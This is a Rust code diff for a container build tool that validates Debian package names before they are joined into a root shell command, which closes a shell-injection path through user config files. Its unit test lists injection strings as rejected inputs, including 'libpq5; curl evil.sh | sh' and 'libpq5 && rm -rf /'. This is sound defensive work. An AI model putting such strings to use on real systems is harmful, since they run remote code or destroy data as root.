@@ -10,6 +10,7 @@ use indexmap::IndexMap;
 use crate::app::App;
 use crate::config::Config;
 use crate::env::Environment;
+use crate::error::Error;
 use crate::error::Result;
 use crate::lock::Lock;
 use crate::mise::{self, MisePackages};
@@ -250,6 +251,15 @@ impl<'a> BuildContext<'a> {
         self.runtime_includes_runtimes = included;
     }
 
+    /// Whether the runtime image will carry the installed runtimes.
+    ///
+    /// A provider that adds a runtime package for a mise-installed binary has
+    /// to ask: a static site drops `/mise` entirely, so a library that only
+    /// exists for one of those binaries is dead weight there.
+    pub fn runtime_includes_runtimes(&self) -> bool {
+        self.runtime_includes_runtimes
+    }
+
     /// Set the command the container runs.
     pub fn set_start_command(&mut self, command: impl Into<String>) {
         self.start_command = Some(command.into());
@@ -328,6 +338,10 @@ impl<'a> BuildContext<'a> {
         if self.custom_base_image {
             self.build_apt_packages.push("ca-certificates".to_string());
         }
+
+        // Both lists end up joined into a shell command that runs as root.
+        check_apt_packages(&self.build_apt_packages)?;
+        check_apt_packages(&self.deploy_apt_packages)?;
 
         let mut plan = BuildPlan::new();
         plan.caches = self.caches.clone();
@@ -530,6 +544,51 @@ fn apt_install(packages: &[String]) -> String {
     )
 }
 
+/// Whether `name` is a legal Debian package name.
+///
+/// Policy from Debian: lowercase alphanumerics plus `+`, `-`, `.`, at least
+/// two characters, starting alphanumeric. An architecture qualifier (`:any`)
+/// and a version pin (`=1.2.3`) are both accepted because `apt-get install`
+/// takes them.
+///
+/// This matters because the list is joined with spaces into a shell command
+/// (see `apt_install`) that runs as root. Nothing in the built-in tables can
+/// produce a bad name, but `apt_packages` in `autopack.json` — and the
+/// `railpack.json` / `nixpacks.toml` compatibility readers, which are honoured
+/// by default — come from the app directory. Rejecting is right rather than
+/// quoting: a name that needs quoting is not a package name, and a clear error
+/// beats an apt failure the user has to decode.
+fn is_valid_apt_package(name: &str) -> bool {
+    let name = name.split_once('=').map_or(name, |(name, _)| name);
+    let name = name.split_once(':').map_or(name, |(name, _)| name);
+
+    name.len() >= 2
+        && name
+            .chars()
+            .next()
+            .is_some_and(|c| c.is_ascii_lowercase() || c.is_ascii_digit())
+        && name
+            .chars()
+            .all(|c| c.is_ascii_lowercase() || c.is_ascii_digit() || matches!(c, '+' | '-' | '.'))
+}
+
+/// Reject any apt package name that is not one, before it reaches a shell.
+fn check_apt_packages(packages: &[String]) -> Result<()> {
+    for package in packages {
+        if !is_valid_apt_package(package) {
+            return Err(Error::Provider {
+                provider: "apt".to_string(),
+                message: format!(
+                    "`{package}` is not a valid Debian package name. \
+                     Package names are lowercase alphanumerics with `+`, `-` and `.`, \
+                     optionally followed by `:arch` or `=version`."
+                ),
+            });
+        }
+    }
+    Ok(())
+}
+
 /// The runtime account to create, honouring `AUTOPACK_USER`.
 ///
 /// Non-root is the default. Container escapes and volume-mount mistakes are
@@ -558,6 +617,41 @@ mod tests {
         let dir = tempfile::tempdir().unwrap();
         fs::write(dir.path().join("main.go"), "package main").unwrap();
         dir
+    }
+
+    #[test]
+    fn apt_package_names_are_validated_before_they_reach_a_shell() {
+        // apt_install joins these with spaces into a RUN that executes as
+        // root, and the list is reachable from autopack.json — plus the
+        // railpack/nixpacks compatibility readers, which are on by default.
+        for bad in [
+            "libpq5; curl evil.sh | sh",
+            "libpq5 && rm -rf /",
+            "$(id)",
+            "`id`",
+            "lib pq5",
+            "LIBPQ5",
+            "-flag",
+            "a",
+        ] {
+            assert!(!is_valid_apt_package(bad), "{bad} should be rejected");
+        }
+
+        for good in [
+            "libpq5",
+            "ca-certificates",
+            "libatk1.0-0",
+            "g++",
+            "libstdc++6",
+            "libc6:arm64",
+            "curl=7.88.1-10",
+        ] {
+            assert!(is_valid_apt_package(good), "{good} should be accepted");
+        }
+
+        let err = check_apt_packages(&["libpq5; id".to_string()]).unwrap_err();
+        assert!(err.to_string().contains("not a valid Debian package name"));
+        assert!(check_apt_packages(&["libpq5".to_string()]).is_ok());
     }
 
     #[test]
